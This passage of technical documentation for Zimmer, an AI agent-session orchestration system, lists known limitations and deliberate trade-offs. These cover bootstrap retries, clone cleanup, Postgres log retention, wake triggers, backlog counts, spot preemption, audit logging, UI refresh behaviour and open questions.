So a fleet-wide bootstrap fault — the 2026-09-02 `EXDEV` outage is the worked case — is now
*survived* rather than *seen*. For up to the ladder's ~52 minutes it produces no failed sessions and
no operator-facing count, only a growing set of sessions that look queued. If the fault clears, that
is the intended outcome and nobody needed to know. If it does not, every affected session reaches
`failure_reason: "bootstrap_retries_exhausted"` and pages, an hour later than the old behaviour
would have.

The trade was made deliberately in that direction: the old behaviour's alert was loud and its
recovery was a human restarting sessions by hand seven hours later.

## A bootstrap retry deletes its own clone, so a delete that fails leaks one

`AgentSessionJob#retry_bootstrap_failure` clears `Session::SETUP_ARTIFACT_KEYS` so the next attempt
re-runs `air prepare` rather than adopting a clone that was never prepared (`#perform`'s reuse arm
does not call it), and then deletes the tree through `AtomicCloneRemoval`. Deleting rather than
leaving it for a reaper is deliberate: every clone reaper's youngest age bar is
`OrphanCloneFilesystemCleanupJob::PRESSURE_AGE_THRESHOLD` at two hours, and the whole retry ladder
fits inside that, so an abandoned clone would be unreclaimable for the entire window in which more
of them are being made.

The cost is that the delete happens inside a rescue block, on a path whose whole premise is that
something is already wrong with the host. It is wrapped and best-effort — a delete that raises is
logged at `warn` and the retry proceeds, because the metadata pointer is already gone and that is
the part the next attempt depends on. So a filesystem sick enough to fail both `rename` and `rm_rf`
leaks one directory per attempt, at most five per session, with no pointer left for
`DeferredCloneCleanupJob` or `StaleCloneCleanupJob` to find it by. `OrphanCloneFilesystemCleanupJob`
is what reclaims those, at its 48-hour scheduled bar or its two-hour pressure bar.

## A parked boot failure is invisible to the health rollups

The same park comes to rest in `needs_input`, and `HealthMonitorService#failure_reason_distribution`
and `#recent_failures` both query `status: :failed`. So a turn parked with
`failure_reason: "undelivered_turn"` does not appear on `/health`, in `GET /api/v1/health`, or in
`get_system_health` — a systemic run of boot failures (a broken catalog, say) is visible one session
at a time in the action queue rather than as a count.

Nothing about the *alerting* changed: the session's ERROR lines, the stamped exception and the
re-raise into Sentry and the terminal ActiveJob ERROR are all unaffected. It is the operator-facing
failure-reason histogram that has the blind spot, and widening its query to include parked sessions
is the fix.

---

## Log retention frees space in Postgres, but not on the disk

`LogRetentionJob` bounds the `logs` table by time
([#437](https://github.com/tadasant/zimmer/issues/437)), and from the first tick the table stops
growing. It does not give back the space already allocated: `DELETE` marks tuples dead, autovacuum
returns them to the free space map, and the heap file stays the size it reached. A deployment that
had already grown `logs` to 24 GB — staging's measured size — gets a table that stops growing and a
volume that is still 24 GB fuller until somebody runs `VACUUM FULL logs` or `pg_repack`, both of
which need free space equal to the table to run at all.

That reclamation is deliberately not automated. `VACUUM FULL` takes an `ACCESS EXCLUSIVE` lock for
its whole duration — on a 19 GB heap, long enough to be an outage — and a background job is the
wrong thing to hold it. The per-environment steps are in
[Background jobs](/operate/background-jobs/#deleting-does-not-shrink-the-files).

The corollary on a deployment that has never had retention: the first drain is measured in hours,
not one tick. `LogRetentionJob` deletes 5,000 rows at a time inside a 90-second slice, every 10
minutes, so it converges on a 124M-row backlog over a day or so rather than immediately. That is the
intended trade — the alternative is one statement holding a transaction over a hundred million rows
on the database whose disk is the problem.

## Log retention slows down, and can stall, on a table whose ids and timestamps disagree

`LogRetentionJob` picks the id range one tick scans by binary-searching the primary key, which is
exact only while ids and `created_at` ascend together — true to within a transaction's duration for a
sequence-backed key stamped with `now()`, which is the only way Zimmer writes `logs`. When something
else writes them out of order (a backfill, an import, a restore that renumbers the sequence), the
search stops under the disagreement and the
[head probe](/operate/background-jobs/#it-is-designed-to-meet-a-table-that-is-already-enormous)
takes over: a ceiling just past the first 25,000 rows, so the table drains in 25,000-row steps per
tick instead of in one sweep.

**Correctness is never affected.** The cutoff is a predicate on the delete itself, so no row inside
its retention window is ever deleted, whatever the ceiling says. The error is only ever in the
direction of deleting too little.

**The probe converges, up to one boundary, and that boundary is real.** As the rows in its window go
the window slides forward, so an out-of-order table drains tick by tick. What it cannot reach is more
than 25,000 *unexpired* rows sitting below *every* expired row: the ceiling never gets past them, the
pass deletes nothing, and retention stalls for as long as that holds. Nothing in Zimmer produces it —
`logs.created_at` has no writer other than the insert default — but a renumbered sequence or a
partial restore would, and it fails silently apart from the `/health` panel's own blind spot below.
`test "more unexpired rows than the probe window is wide is a documented stall"` pins the boundary
where it is.

The fix for the stall specifically is an index on `logs.created_at`, off which the ceiling could be
read directly instead of binary-searched, and it is still not here. `logs` does now carry
`index_logs_on_level_and_id_and_created_at`, but `created_at` is its third column, so it cannot serve
that read and `ceiling_id` still searches the primary key. That index was added for a different
problem — the verbose batch selector's scan cost, described below — and it does not move this one.

What has changed is the reason. Until 2026-09-06 this page said an index on `logs` was unaffordable
outright, because it would be built during `db:prepare` at container boot inside kamal-proxy's
120-second `deploy_timeout`. That was true of the 124M-row table the retention work was written
against; production's `logs` is now ~3.3M rows, and the boot path is no longer the only place a build
can happen. An index on `logs` is a question of whether it earns its keep on the insert path, not of
whether the deploy survives it — see
[The verbose pass has an index](/operate/background-jobs/#the-verbose-pass-has-an-index-and-why-it-needed-one).

## The verbose retention pass re-walks what it has already deleted

`LogRetentionJob`'s verbose pass restarts each tick at a ceiling near the 7-day boundary and walks
down. Everything it deletes it deletes from the top of that range, so the region just below the
ceiling is the part previous ticks already emptied — and the first batch of the next tick walks over
it again. The prefix grows monotonically, and it does not stop growing when the backlog is gone: with
no expired verbose rows left, the selector walks the whole span below the ceiling to collect the thin
sliver that crossed the window in the last ten minutes, and does it again ten minutes later.

`index_logs_on_level_and_id_and_created_at` makes that walk an index-only scan over just the rows the
pass can delete, which is what took the query off the top of `DatabaseChoke`
([#329](https://github.com/tadasant/zimmer/issues/329)). The re-walk itself is still in the design:
the ceiling is recomputed from scratch every tick and nothing carries across ticks. It is cheap now
rather than absent, and it is bounded by the number of rows the pass will actually delete.

## The log retention panel reports the lowest-id row, not the oldest

`log_retention_health` reads `oldest_log_at` as the `created_at` of the row with the smallest id, not
as `MIN(created_at)` — which, with no index on that column, would be a sequential scan of the very
table the panel exists to say is too big. Under the ordering `LogRetentionJob` assumes the two are
the same reading, and the panel inherits exactly the assumption's blind spot: on a table whose ids
and timestamps disagree (above), a recent row with a low id makes the table look younger than it is,
and the panel can read *Healthy* while expired rows above that row are never collected.

The verbose half of the check is bounded for the same reason — it looks for the oldest `verbose` row
only within the first 25,000 rows by id — so a verbose row stranded past that window is invisible to
it too. Both readings are cheap by construction rather than exhaustive by construction; the intended
signal is "retention is running", not "no expired row exists anywhere".

## Log retention destroys timeline history nobody can regenerate

The rows `LogRetentionJob` deletes are live-referenced: every archived session's timeline renders
them. Past 7 days a session's `verbose` lines — the runtime CLI's raw stdout — are gone, and past 90
days its whole `logs` half of the timeline is. The transcript is unaffected and it is what the
timeline shows by default, so what is actually lost is the `[State Machine]` / process-lifecycle
annotations beside it. There is no archive of them and no way to reconstruct them.

This is the point of the change rather than a defect in it, but it is a real subtraction, and the
windows are the only thing standing between "bounded table" and "history a person wanted". They are
constants on `Log` (`RETENTION`, `VERBOSE_RETENTION`) with no runtime override — changing them is a
deploy, not a setting.

## A held wake can fire into the turn it woke, if that turn runs long

A fired one-time wake now [holds its group](/sessions/triggers/#wake-up-semantics) rather than
destroying it, so an interrupted turn is not left with nothing. The group stays *fireable* for the
duration of that turn, which is what makes it a rescue — and it means a member of it can fire while
the turn is still running.

Two shapes reach it. A deadline backstop set 15 minutes out, on a turn that takes 20. Or a watched
session reaching a second state (`archived` after `needs_input`) while the requester is still working
on the first. In both cases `Trigger#follow_up_session!` sees a `running` session and *queues* the
prompt, so the turn is not interrupted — the requester simply takes one more turn afterwards, on a
wake it would previously never have heard about.

That extra turn is the deliberate trade. The alternative shape of the same race is worse and is what
the old behaviour did: the requester re-arms a watcher for a transition that already happened, and
sleeps on a wake that can never fire. `StrandedSleepRescue` catches that within ~20 minutes; nothing
catches a wait the fleet has silently stopped waiting on.

A held wake is also visible at `/triggers` as an ordinary enabled wake for the length of the turn.
There is no "held" badge — the row is gone again once the turn comes to rest, and adding a UI state
for a window measured in minutes was not worth the surface.

## A recovered follow-up keeps its text and loses its attachments

`metadata["pending_follow_up_prompt"]` is [the slot a resume path reads](/sessions/lifecycle/#and-a-follow-up-the-session-is-still-holding-outranks-it-too)
to deliver an accepted follow-up instead of the recovery nudge, and it holds one string. A follow-up
sent with images or files carries them as arguments of the `AgentSessionJob` it enqueues, not in that
slot — so when the slot is what survives, the text comes back and the attachments do not.

Two paths reach it: `AgentSessionJob#preserve_interrupted_prompt`, handing an interrupted job's
prompt back to the row, and the four automated resumes that read `Session#recovery_turn_prompt` and
call `enqueue_with_prompt` with the prompt alone. The agent is then asked about a screenshot it
cannot see, with nothing in the turn to say one was ever attached.

`Sessions::RequeueSkippedPrompt` does not have this shape — an `EnqueuedMessage` has `images` and
`files` columns, so a prompt parked in the durable queue keeps its attachments. Widening the marker
to a structured value, or routing the hand-back through the queue instead, would close it; neither
was worth doing inside the fix that made the text survive at all, where the alternative was losing
the whole message.

## Nothing bounds the work backlog's pile of parked sessions

[`in_flight`](/operate/work-backlog/#what-in_flight-counts) counts started items whose session is
`running` or `waiting`, so a session parked in `needs_input` holding a finished PR no longer holds a
WIP slot. That is right for the throttle — the alternative ratchets the ceiling shut and stops the
queue draining — but it means nothing counts the parked pile down any more, and nothing else picks
up the slack: `SpotGateService`'s fleet cap measures turns on or awaiting a worker, so parked
sessions are outside it too, and `needs_input` is in `Session::NON_REAPABLE_STATUSES`, so each
parked session holds its repository clone indefinitely.

So if merging stalls for a fortnight, the nightly pull keeps pulling three a night against an
`in_flight` that never rises, `parked` climbs, and the clones accumulate on disk with no reaper.

There is no automatic bound, deliberately: the fix for "the fleet is finishing work nobody is
merging" is to merge it, not to stop the fleet. What ships instead is visibility — `counts.parked`
on every read surface, `status: "parked"` to list the items, a **Parked on a person** section on
[the Issues view](/operate/issues-view/), and prose in `pull_work_backlog_items` telling a groomer
that a growing `parked` pile means go and merge rather than pull more. A ceiling on `parked` that
halts pulling by itself would be the next step if the prose turns out not to be enough.

## A preempted session is invisible until it goes dormant

When a priority session [takes a slot](/sessions/spot-and-priority/#a-priority-session-takes-a-slot),
the spot session it takes it from is *marked* and keeps running until its turn ends — up to
`SpotPreemption::GRACE` (10 minutes), and longer if the fleet keeps falling under its cap and the
mark keeps being released and re-taken.

For that window the mark shows up nowhere but the session's own log. Every surface that explains a
dormant session keys on the session actually being dormant: `SessionWaitingReason` reads
`SpotSessionPause.paused?`, which requires `waiting`; the session page's spot banner is gated on that
reading; and `/inference`'s **preempted by priority work** figure counts the `waiting` queue. So a
human looking at a marked session sees an ordinary running session, and the count on `/inference` can
be zero while three sessions are on their way into the queue.

That is a deliberate trade rather than an oversight — the alternative is a fifth mechanism in
`SessionWaitingReason`, which is a ranking over *dormancies*, for a state that is not one — but it is
a real gap, and the sweep's own log lines are the only place to see it today.

Two smaller edges around the same window:

- `Session::STALE_RETRY_METADATA_KEYS` clears `spot_pause_reason` but not `pending_sleep`, so a
  recovery path that runs against a marked-but-running session strips the record and leaves the sleep
  intent. The session then sleeps into `waiting` with no park record and no wake armed. This is not
  new — `pause_into_spot_queue` without `halt:` has exactly the same window — but preemption makes it
  reachable without anyone asking for it.
- If the fleet keeps flapping across its cap, a session can be marked and released repeatedly without
  ever being preempted. Nothing is lost each time (the release un-charges the ledger), but the log
  gets noisy.

## A fleet-policy change is recorded but never announced

Every persisted change to the spot gate, the concurrency limit and the backlog top-up thresholds
writes a `[FleetPolicy]` line at WARN — see [Every change to both
ceilings is recorded](/sessions/spot-and-priority/#every-change-to-both-ceilings-is-recorded). That
closes the gap where a cap could go back down with no trace at all, but only halfway:

- **Nothing counts the lines and nothing alerts on them.** There is no intended-policy value for a
  health check to compare the live row against, so a revert is reconstructible from one VictoriaLogs
  query and is still not announced to anyone. The symptom remains a fleet quietly running slower than
  its budget supports.
- **`update_column` and `update_all` bypass it**, as they bypass every callback. Nothing in Zimmer
  writes these columns that way — the pollers use both only for their own state columns — but a
  console session reaching for either moves the policy without a record.
- **The `/inference` forms have no stale-submit protection.** Each card posts every field it renders,
  with no `lock_version`, so a page rendered at one moment and submitted at another writes its own
  stale values back over anything changed in between. The audit line makes that visible after the
  fact; it does not prevent it.

## A partly-mapped roster, or an `unknown` genesis, still reads as an affirmative absence

The Human Messages record now distinguishes "no named human spoke" from "capture is not configured
for the channel this work arrived over" — see
[Hierarchy and human messages](/sessions/hierarchy-and-human-messages/#absence-is-only-an-answer-when-capture-could-have-fired).
The check behind that distinction is **deployment-wide**, and it has to be: the message Zimmer did
not record is the one that cannot be consulted, so the question must be answerable without it. It
asks *"could any Slack message have resolved to anybody?"*, not *"was this actor mapped?"*.

Two cases therefore still render as an affirmative absence when they are not one:

- **A partly-mapped roster.** Fill in one human's Slack user ID at `/supervisor/users` and leave the
  other's blank, and Slack counts as instrumented. The unmapped human can then speak on Slack, spawn
  a session, and have the record say *"No message anywhere in this hierarchy was authored by a named
  human"*. Every `reason` string is careful to claim only *"no row maps **any** Slack user ID"*, so
  nothing over-claims in prose — but the empty record is still the affirmative sentence. Map every
  human who can trigger Zimmer, not just the first one.
- **A session whose genesis is `unknown`.** `unknown` means the origin could not be established
  (chiefly rows predating the genesis column), so it maps to no channel and reports no gap. A
  Slack-origin session sitting on `unknown` is invisible to the check.

Both would need a per-actor signal that does not exist: a Slack message from an unmapped user leaves
no trace anywhere in Zimmer, which is exactly the property being worked around.

## "In flight" still counts two dormant populations it does not name

`counts.in_flight` on the work backlog is every `started` item whose session is `running` or
`waiting`, and the WIP ceiling the groomer pulls against is computed from it. `waiting` covers more
than "queued for a worker": it also covers sessions nothing is advancing at all.

[`spot_held`](/operate/work-backlog/#spot_held-why-a-pull-of-zero-is-not-always-healthy) splits out
the largest of those — sessions the spot gate refused before a turn — so a pull of zero can be read.
Two others are left inside, and both are `waiting` with no agent advancing them:

- a session the **spot ceiling paused mid-run**, resumed by `SpotCeilingSweepJob`
- a session **parked on an auth outage**, resumed by `AuthOutageParkService`

`SpotSessionHold.held_sessions` deliberately excludes both, because each belongs to its own
population with its own resume owner and counting them there would double-count them. The
consequence is that the Issues page's "an agent is still advancing" figure, and the ceiling
arithmetic behind the pull, both overstate by however many of those exist. In practice they are
small and short-lived where the held pile was neither — but the general form of
[#1103](https://github.com/tadasant/zimmer/issues/1103), "a session that has never taken a turn
should perhaps not hold a WIP slot at all, whatever the reason", is not closed.

## Categorization replay does not tell you when it is done

**Replay** on `/settings/categorization` enqueues `CategorizationReplayJob` and redirects straight
back. The page does not update itself as the verdicts land. You reload it, and each correction's
verdict chip appears once its row has been scored. A batch of 10 on a free `inference` lane takes
well under a minute. Behind a backlog of title jobs it can take longer, and nothing on the page
says it is still queued.

Two related edges:

- **The corpus table has no retention.** Every categorization attempt that gets an answer adds
  one row with up to 8 KB of context, compressed by TOAST. A session placed first time
  contributes one row. A session left Uncategorized is retried on each pause, so it contributes
  one per attempt until it's placed. That's still small next to `logs`. Nothing prunes it yet,
  on purpose: the rows are the eval corpus, and they are meant to outlive the sessions they came
  from.
- **A replay verdict is from the config at the time it ran.** Edit a description after replaying
  and the chips still show the old verdicts until you replay again. `replay_prompt_version` and
  `replay_model` on each row say which config produced it, and `/supervisor/category_feedback_events`
  shows both.

## The User view's board does not update itself

The [User view](/sessions/user-view/) is server-rendered on load and stays that way. A row's status
pill does not follow the session live, and a session that becomes eligible for the board while you
are looking at it does not appear until you reload. The [Ranked view](/sessions/spot-and-priority/#the-ranked-view)
does both, over `Session::RANKED_STREAM`, and the User view deliberately did not take that on in its
first pass — live membership on a filtered board is a whole mechanism (the envelope, the held
deliveries, the reconnect backfill), and the actions this view exists for do not need it.

What *is* immediate is everything the operator does themselves: Trash removes the row over the
turbo stream `#archive` already answers with, Snooze removes it through the shared visibility
controller, Merge re-renders its own button, and a drag re-sorts and persists without a reload. So
the board thins out as you work it, and goes stale only about things you did not do.

The one place that shows is the **Reprioritize** button: the reordering session writes the new order
and you have to reload to see it. The button says so.

## Card order is written by agents and rendered by nobody

`sessions.sort_order` — the per-category card rank `SessionCardOrder` maintains — was the ordering
of the dashboard's category-grouped grid. That grid was replaced by the User view, which orders by
scheduling class and precedence instead, and no human-facing screen reads `sort_order` any more.

Its two remaining writers are both agent surfaces: `manage_categories`' `reorder_sessions` action
over MCP, and `POST /api/v1/sessions/reorder` over REST. Both still work and still record a
`category_feedback_events` correction; the order they set is simply not drawn anywhere. They were
left in place rather than removed because the correction they record is the categorizer's training
signal, which is worth more than the ordering was.

## Editing a category is a /supervisor task now

The category grid carried the only browser-facing category editor — a pencil per section header and
a **+ New category** button. Both went with it. `/settings/categorization` still lists every
category and flags the ones with no description (which is the classification signal), but to change
one you go to `/supervisor/categories`, the `manage_categories` MCP tool, or the REST API under
`/api/v1/categories`. The page points at the first of those.

## Open questions

Things the code doesn't answer, flagged here rather than guessed at:

- Does the double-suffixed Redis URL (`redis://redis:6379/0/0`) actually work? The client may tolerate
  it or may fall back to db 0. ([#20](https://github.com/tadasant/zimmer/issues/20))
- Does any real MCP server accept the fallback `client_id: "zimmer"`? It looks like it would only work
  against a server that ignores `client_id` entirely. ([#64](https://github.com/tadasant/zimmer/issues/64))
- Is `config_preparer_class` (a `RuntimeRegistry::Bundle` slot) meant to do something? It's `nil` for
  every runtime and nothing reads it. ([#97](https://github.com/tadasant/zimmer/issues/97))
- Does the macOS Keychain path in `CodexMcpCredentialWriter` work? It has never been runtime-verified
  — every worker is Linux. ([#63](https://github.com/tadasant/zimmer/issues/63))
